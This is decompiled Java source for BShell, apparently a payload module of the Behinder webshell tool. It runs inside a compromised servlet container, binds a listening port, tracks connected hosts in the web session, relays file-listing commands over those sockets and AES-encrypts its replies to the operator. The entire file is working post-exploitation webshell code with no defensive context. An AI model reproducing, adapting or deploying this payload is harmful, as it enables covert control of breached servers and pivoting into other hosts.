// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.net.ServerSocket;
import java.nio.ByteBuffer;
import java.io.ByteArrayOutputStream;
import java.nio.channels.SocketChannel;
import java.io.IOException;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.nio.channels.ServerSocketChannel;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Iterator;
import java.util.List;
import java.net.Socket;
import java.util.ArrayList;
import javax.servlet.ServletOutputStream;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class BShell implements Runnable
{
    public static String action;
    public static String target;
    public static String localPort;
    public static String params;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    
    public BShell() {
    }
    
    public BShell(final HttpSession session) {
        this.Session = session;
    }
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        Map<String, String> result = new HashMap<String, String>();
        this.Response.setCharacterEncoding("UTF-8");

        //兼容zcms
        if(Session.getAttribute("payload")!=null){
            Session.removeAttribute("payload");
        }
        try {
            if (BShell.action.equals("create")) {
                this.createBShell();
                result.put("msg", BShell.target + "\u7684BShell\u521b\u5efa\u6210\u529f");
                result.put("status", "success");
            }
            else if (BShell.action.equals("list")) {
                result = this.listBShell(page);
            }
            else if (BShell.action.equals("close")) {
                result = this.closeBShell(page);
            }
            else if (BShell.action.equals("clear")) {
                result = this.clearBShell(page);
            }
            else {
                result.put("msg", this.doWork());
                result.put("status", "success");
            }
        }
        catch (Exception e) {
            e.printStackTrace();
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }
        try {
            final ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
    
    private Map<String, String> listBShell(final PageContext page) throws Exception {
        final Map<String, String> result = new HashMap<String, String>();
        if (this.Session.getAttribute("BShellList") != null) {
            final Map<String, Socket> BShellList = (Map<String, Socket>)this.Session.getAttribute("BShellList");
            final List<Map<String, String>> objArr = new ArrayList<Map<String, String>>();
            for (final String targetIP : BShellList.keySet()) {
                final Socket socket = BShellList.get(targetIP);
                final Map<String, String> obj = new HashMap<String, String>();
                obj.put("target", targetIP);
                obj.put("status", socket.isConnected() + "");
                objArr.add(obj);
            }
            result.put("status", "success");
            result.put("msg", this.buildJsonArray(objArr, true));
        }
        else {
            result.put("status", "fail");
            result.put("msg", "\u6ca1\u6709\u5b58\u6d3b\u7684BShell\u8fde\u63a5");
        }
        return result;
    }
    
    private Map<String, String> closeBShell(final PageContext page) throws Exception {
        final Map<String, String> result = new HashMap<String, String>();
        if (this.Session.getAttribute("BShellList") != null) {
            final Map<String, Socket> BShellList = (Map<String, Socket>)this.Session.getAttribute("BShellList");
            if (BShellList.containsKey(BShell.target)) {
                final Socket socket = BShellList.get(BShell.target);
                if (socket != null && !socket.isClosed()) {
                    socket.close();
                }
                BShellList.remove(BShell.target);
                result.put("status", "success");
                result.put("msg", "\u8fde\u63a5\u5230\u3010" + BShell.target + "\u3011\u7684BShell\u5df2\u5173\u95ed\u3002");
            }
            else {
                result.put("status", "fail");
                result.put("msg", "\u6ca1\u6709\u627e\u5230\u8fde\u63a5\u5230\u3010" + BShell.target + "\u3011\u7684BShell\u3002");
            }
        }
        else {
            result.put("status", "fail");
            result.put("msg", "\u6ca1\u6709\u5b58\u6d3b\u7684BShell\u8fde\u63a5");
        }
        return result;
    }
    
    private Map<String, String> clearBShell(final PageContext page) throws Exception {
        final Map<String, String> result = new HashMap<String, String>();
        if (this.Session.getAttribute("BShellList") != null) {
            this.Session.removeAttribute("BShellList");
        }
        result.put("status", "success");
        result.put("msg", "BShell\u5df2\u6e05\u7a7a\u3002");
        return result;
    }
    
    private String buildJsonArray(final List<Map<String, String>> list, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (final Map<String, String> entity : list) {
            sb.append(this.buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final Object custmKeyObj = this.Request.getAttribute("parameters");
        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private void createBShell() {
        new Thread(new BShell(this.Session)).start();
    }
    
    @Override
    public void run() {
        try {
            final ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
            serverSocketChannel.socket().bind(new InetSocketAddress(Integer.parseInt(BShell.localPort)));
            serverSocketChannel.configureBlocking(false);
            while (true) {
                final SocketChannel socketChannel = serverSocketChannel.accept();
                if (socketChannel == null) {
                    continue;
                }
                final String remoteIP = socketChannel.socket().getInetAddress().getHostAddress();
                final String key = "BShell_" + remoteIP;
                this.Session.setAttribute(key, (Object)socketChannel);
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private String doWork() throws Exception {
        final String key = "BShell_" + BShell.target;
        final SocketChannel socketChannel = (SocketChannel)this.Session.getAttribute(key);
        if (socketChannel == null) {
            throw new Exception("\u6307\u5b9a\u7684BShell\u4e0d\u5b58\u5728\uff1a" + BShell.target);
        }
        final ByteArrayOutputStream baos = new ByteArrayOutputStream();
        if (BShell.action.equals("listFile")) {
            final Map<String, String> paramsMap = this.str2map(BShell.params);
            final String path = paramsMap.get("path");
            final ByteBuffer writeBuf = ByteBuffer.allocate(path.getBytes().length + 1);
            writeBuf.put((path + "\n").getBytes());
            writeBuf.flip();
            socketChannel.write(writeBuf);
            final ByteBuffer readBuf = ByteBuffer.allocate(512);
            for (int bytesRead = socketChannel.read(readBuf); bytesRead > 0; bytesRead = socketChannel.read(readBuf)) {
                baos.write(readBuf.array(), 0, bytesRead);
                if (readBuf.get(bytesRead - 4) == 55 && readBuf.get(bytesRead - 3) == 33 && readBuf.get(bytesRead - 2) == 73 && readBuf.get(bytesRead - 1) == 54) {
                    break;
                }
                readBuf.clear();
            }
        }
        return new String(baos.toByteArray());
    }
    
    private Map<String, String> str2map(final String params) {
        final Map<String, String> paramsMap = new HashMap<String, String>();
        for (final String line : params.split("\n")) {
            paramsMap.put(line.split("\\^")[0], line.split("\\^")[1]);
        }
        return paramsMap;
    }
    
    public static void main(final String[] args) {
        BShell.localPort = "5555";
        try {
            final ServerSocket serverSocket = new ServerSocket(Integer.parseInt(BShell.localPort), 50);
            while (true) {
                final Socket socket = serverSocket.accept();
                final String remoteIP = socket.getRemoteSocketAddress().toString();
                new StringBuilder().append("BShell_").append(remoteIP).toString();
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}
